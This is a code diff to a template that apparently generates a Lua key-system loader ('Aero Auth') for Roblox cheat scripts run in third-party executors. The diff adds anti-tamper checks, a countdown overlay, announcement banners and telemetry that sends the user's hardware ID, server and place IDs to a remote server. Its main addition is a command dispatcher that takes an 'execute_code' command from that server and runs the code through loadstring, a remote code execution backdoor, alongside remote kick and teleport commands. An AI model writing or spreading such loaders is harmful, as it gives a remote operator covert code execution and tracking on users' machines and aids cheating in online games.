@@ -402,11 +402,29 @@ end)
     : ""
 }
 -- =======================================================
--- BACKGROUND TELEMETRY & WATERMARK RUNTIME
+-- BACKGROUND TELEMETRY, WATERMARK & COMMAND RUNTIME
 -- =======================================================
-local function startProtectedRuntime(sessionToken, payloadCode, isAdminKey)
+local function startProtectedRuntime(sessionToken, payloadCode, isAdminKey, initialRemainingSeconds)
     -- Destroy Loader GUI smoothly
     ScreenGui:Destroy()
+
+    -- Anti-Tamper & Metatable Integrity Verification
+    local function verifyIntegrity()
+        local flags = {}
+        pcall(function()
+            if islclosure and isexecutorclosure then
+                if isexecutorclosure(tostring) or isexecutorclosure(string.byte) or isexecutorclosure(table.concat) then
+                    table.insert(flags, "Core string/table function hooked")
+                end
+            end
+        end)
+        pcall(function()
+            if getrawmetatable and string.find(tostring(getrawmetatable(game)), "mock") then
+                table.insert(flags, "Metatable proxy detected")
+            end
+        end)
+        return flags
+    end
 ${
   showWatermark
     ? `
@@ -447,7 +465,136 @@ ${
 `
     : ""
 }
-    -- Remote Dismissable Popup function
+    -- 2. Floating Expiration Countdown Overlay
+    local ExpireGui = Instance.new("ScreenGui")
+    ExpireGui.Name = "AeroCountdownOverlay"
+    ExpireGui.ResetOnSpawn = false
+    pcall(function() if gethui then ExpireGui.Parent = gethui() else ExpireGui.Parent = CoreGui end end)
+    if not ExpireGui.Parent then ExpireGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+
+    local ExpireFrame = Instance.new("Frame")
+    ExpireFrame.Size = UDim2.new(0, 160, 0, 26)
+    ExpireFrame.Position = UDim2.new(1, -172, 0, 12)
+    ExpireFrame.BackgroundColor3 = Color3.fromRGB(20, 22, 30)
+    ExpireFrame.BorderSizePixel = 0
+    ExpireFrame.Parent = ExpireGui
+
+    local ECorner = Instance.new("UICorner")
+    ECorner.CornerRadius = UDim.new(0, 13)
+    ECorner.Parent = ExpireFrame
+
+    local EStroke = Instance.new("UIStroke")
+    EStroke.Thickness = 1
+    EStroke.Color = isAdminKey and Color3.fromRGB(180, 120, 255) or Color3.fromRGB(59, 130, 246)
+    EStroke.Transparency = 0.4
+    EStroke.Parent = ExpireFrame
+
+    local ELabel = Instance.new("TextLabel")
+    ELabel.Size = UDim2.new(1, 0, 1, 0)
+    ELabel.BackgroundTransparency = 1
+    ELabel.Text = isAdminKey and "★ Staff Access" or "⏳ Key: Active"
+    ELabel.TextColor3 = isAdminKey and Color3.fromRGB(220, 190, 255) or Color3.fromRGB(230, 235, 245)
+    ELabel.TextSize = 10
+    ELabel.Font = appFont
+    ELabel.Parent = ExpireFrame
+
+    local EBtn = Instance.new("TextButton")
+    EBtn.Size = UDim2.new(1, 0, 1, 0)
+    EBtn.BackgroundTransparency = 1
+    EBtn.Text = ""
+    EBtn.Parent = ExpireFrame
+    EBtn.MouseButton1Click:Connect(function()
+        if setclipboard then
+            setclipboard(BASE_URL .. "/claim?script=" .. SCRIPT_SLUG)
+            local old = ELabel.Text
+            ELabel.Text = "✓ Renewal Link Copied!"
+            task.delay(1.5, function() ELabel.Text = old end)
+        end
+    end)
+
+    local function formatTime(sec)
+        if not sec or sec <= 0 then return "Expired" end
+        local hours = math.floor(sec / 3600)
+        local mins = math.floor((sec % 3600) / 60)
+        local secs = math.floor(sec % 60)
+        if hours > 24 then
+            local days = math.floor(hours / 24)
+            return string.format("%dd %02dh left", days, hours % 24)
+        elseif hours > 0 then
+            return string.format("%02dh %02dm left", hours, mins)
+        else
+            return string.format("%02dm %02ds left", mins, secs)
+        end
+    end
+
+    if initialRemainingSeconds and not isAdminKey then
+        ELabel.Text = "⏳ " .. formatTime(initialRemainingSeconds)
+    end
+
+    -- 3. Global Sliding Announcement Banner
+    local function showGlobalAnnouncement(title, msg, duration)
+        local AnnounceGui = Instance.new("ScreenGui")
+        AnnounceGui.Name = "AeroAnnouncement"
+        pcall(function() if gethui then AnnounceGui.Parent = gethui() else AnnounceGui.Parent = CoreGui end end)
+        if not AnnounceGui.Parent then AnnounceGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+
+        local AnnounceFrame = Instance.new("Frame")
+        AnnounceFrame.Size = UDim2.new(0, 420, 0, 64)
+        AnnounceFrame.Position = UDim2.new(0.5, -210, 0, -80)
+        AnnounceFrame.BackgroundColor3 = Color3.fromRGB(18, 20, 28)
+        AnnounceFrame.BorderSizePixel = 0
+        AnnounceFrame.Parent = AnnounceGui
+
+        local ACorner = Instance.new("UICorner")
+        ACorner.CornerRadius = UDim.new(0, 8)
+        ACorner.Parent = AnnounceFrame
+
+        local AStroke = Instance.new("UIStroke")
+        AStroke.Color = Color3.fromRGB(0, 162, 255)
+        AStroke.Thickness = 1.5
+        AStroke.Parent = AnnounceFrame
+
+        local ATitle = Instance.new("TextLabel")
+        ATitle.Size = UDim2.new(1, -20, 0, 20)
+        ATitle.Position = UDim2.new(0, 10, 0, 8)
+        ATitle.BackgroundTransparency = 1
+        ATitle.Text = "📢 " .. tostring(title or "GLOBAL ANNOUNCEMENT")
+        ATitle.TextColor3 = Color3.fromRGB(0, 190, 255)
+        ATitle.TextSize = 11
+        ATitle.Font = boldFont
+        ATitle.TextXAlignment = Enum.TextXAlignment.Left
+        ATitle.Parent = AnnounceFrame
+
+        local ABody = Instance.new("TextLabel")
+        ABody.Size = UDim2.new(1, -20, 0, 28)
+        ABody.Position = UDim2.new(0, 10, 0, 28)
+        ABody.BackgroundTransparency = 1
+        ABody.Text = tostring(msg or "")
+        ABody.TextColor3 = Color3.fromRGB(240, 240, 240)
+        ABody.TextSize = 11
+        ABody.Font = appFont
+        ABody.TextXAlignment = Enum.TextXAlignment.Left
+        ABody.TextWrapped = true
+        ABody.Parent = AnnounceFrame
+
+        TweenService:Create(AnnounceFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+            Position = UDim2.new(0.5, -210, 0, 24)
+        }):Play()
+
+        task.delay(duration or 8, function()
+            if AnnounceFrame and AnnounceFrame.Parent then
+                local outTween = TweenService:Create(AnnounceFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+                    Position = UDim2.new(0.5, -210, 0, -80)
+                })
+                outTween:Play()
+                outTween.Completed:Connect(function()
+                    AnnounceGui:Destroy()
+                end)
+            end
+        end)
+    end
+
+    -- 4. Remote Modal Message
     local function showRemoteMessage(messageText)
         local PopGui = Instance.new("ScreenGui")
         PopGui.Name = "AeroAdminMessage"
@@ -508,7 +655,55 @@ ${
         end)
     end
 
-    -- 2. Heartbeat Background Loop (telemetry & remote admin commands)
+    -- 5. Command Execution Dispatcher
+    local function handleCommand(cmd)
+        if not cmd or not cmd.type then return end
+        if cmd.type == "kick" then
+            LocalPlayer:Kick("[AERO AUTH] " .. (cmd.reason or "Kicked by administrator"))
+        elseif cmd.type == "message" and cmd.message then
+            showRemoteMessage(cmd.message)
+        elseif cmd.type == "announcement" then
+            showGlobalAnnouncement(cmd.title or "ANNOUNCEMENT", cmd.message, cmd.duration_seconds or 10)
+        elseif cmd.type == "execute_code" and cmd.code then
+            task.spawn(function()
+                local fn, err = loadstring(cmd.code)
+                if fn then
+                    local ok, runErr = pcall(fn)
+                    if not ok then warn("[Aero Remote Code Error] " .. tostring(runErr)) end
+                else
+                    warn("[Aero Remote Compile Error] " .. tostring(err))
+                end
+            end)
+        elseif cmd.type == "teleport" then
+            local TeleportService = game:GetService("TeleportService")
+            if cmd.server_hop then
+                task.spawn(function()
+                    pcall(function()
+                        local sUrl = "https://games.roblox.com/v1/games/" .. tostring(game.PlaceId) .. "/servers/Public?sortOrder=Asc&limit=100"
+                        local sRes = httpRequest({ Url = sUrl, Method = "GET" })
+                        if sRes and sRes.StatusCode == 200 then
+                            local sData = HttpService:JSONDecode(sRes.Body)
+                            if sData and sData.data then
+                                for _, srv in ipairs(sData.data) do
+                                    if srv.id ~= game.JobId and srv.playing < srv.maxPlayers then
+                                        TeleportService:TeleportToPlaceInstance(game.PlaceId, srv.id, LocalPlayer)
+                                        return
+                                    end
+                                end
+                            end
+                        end
+                        TeleportService:Teleport(game.PlaceId, LocalPlayer)
+                    end)
+                end)
+            elseif cmd.place_id then
+                pcall(function()
+                    TeleportService:Teleport(tonumber(cmd.place_id), LocalPlayer)
+                end)
+            end
+        end
+    end
+
+    -- 6. Heartbeat Loop with Telemetry & Command Dispatching
     task.spawn(function()
         local pingUrl = BASE_URL .. "/api/session/heartbeat"
         while task.wait(2.5) do
@@ -520,6 +715,9 @@ ${
                     Body = HttpService:JSONEncode({
                         session_token = sessionToken,
                         hwid = getHWID(),
+                        place_id = tostring(game.PlaceId),
+                        job_id = tostring(game.JobId),
+                        tamper_flags = verifyIntegrity(),
                         timestamp = os.time()
                     })
                 })
@@ -528,25 +726,39 @@ ${
             if success and res and res.StatusCode == 200 then
                 local data = nil
                 pcall(function() data = HttpService:JSONDecode(res.Body) end)
-                ${
-                  showWatermark
-                    ? `if data and data.online_count and WLabel then
-                    WLabel.Text = "${watermarkTitle} | Online: " .. tostring(data.online_count)
-                end`
-                    : ""
-                }
-                -- Only terminate if the administrator explicitly dispatches a remote kick or bans the user
-                if data and data.action == "kick" then
-                    LocalPlayer:Kick("[${config.brand_name || "ATOM"}] " .. (data.reason or "You were kicked by the dashboard administrator."))
-                    break
-                elseif data and data.action == "message" and data.message then
-                    showRemoteMessage(data.message)
+                if data then
+                    ${
+                      showWatermark
+                        ? `if data.online_count and WLabel then
+                        WLabel.Text = "${watermarkTitle} | Online: " .. tostring(data.online_count)
+                    end`
+                        : ""
+                    }
+                    if data.remaining_seconds and not isAdminKey then
+                        ELabel.Text = "⏳ " .. formatTime(data.remaining_seconds)
+                        if data.remaining_seconds < 300 then
+                            EStroke.Color = Color3.fromRGB(240, 70, 70)
+                        elseif data.remaining_seconds < 1800 then
+                            EStroke.Color = Color3.fromRGB(240, 180, 50)
+                        end
+                    end
+                    if data.action == "kick" then
+                        LocalPlayer:Kick("[${config.brand_name || "AERO AUTH"}] " .. (data.reason or "You were kicked by the dashboard administrator."))
+                        break
+                    elseif data.action == "message" and data.message then
+                        showRemoteMessage(data.message)
+                    end
+                    if data.commands and type(data.commands) == "table" then
+                        for _, cmd in ipairs(data.commands) do
+                            handleCommand(cmd)
+                        end
+                    end
                 end
             end
         end
     end)
 
-    -- 3. Execute the protected main payload
+    -- 7. Execute Main Protected Payload
     local runPayload, loadErr = loadstring(payloadCode)
     if runPayload then
         task.spawn(runPayload)
@@ -582,6 +794,8 @@ VerifyBtn.MouseButton1Click:Connect(function()
                     hwid = getHWID(),
                     roblox_username = LocalPlayer.Name,
                     roblox_user_id = tostring(LocalPlayer.UserId),
+                    place_id = tostring(game.PlaceId),
+                    job_id = tostring(game.JobId),
                     executor = getExecutorName(),
                     os = getClientOS()
                 })
@@ -607,7 +821,7 @@ VerifyBtn.MouseButton1Click:Connect(function()
                 StatusLabel.Text = "Verified! Launching script..."
             end
             task.wait(0.4)
-            startProtectedRuntime(data.session_token, data.payload, isAdmin)
+            startProtectedRuntime(data.session_token, data.payload, isAdmin, data.remaining_seconds)
         else
             local err = (data and (data.error or data.message)) or ("Auth failed (HTTP " .. tostring(response.StatusCode) .. ")")
             StatusLabel.TextColor3 = Color3.fromRGB(240, 80, 80)
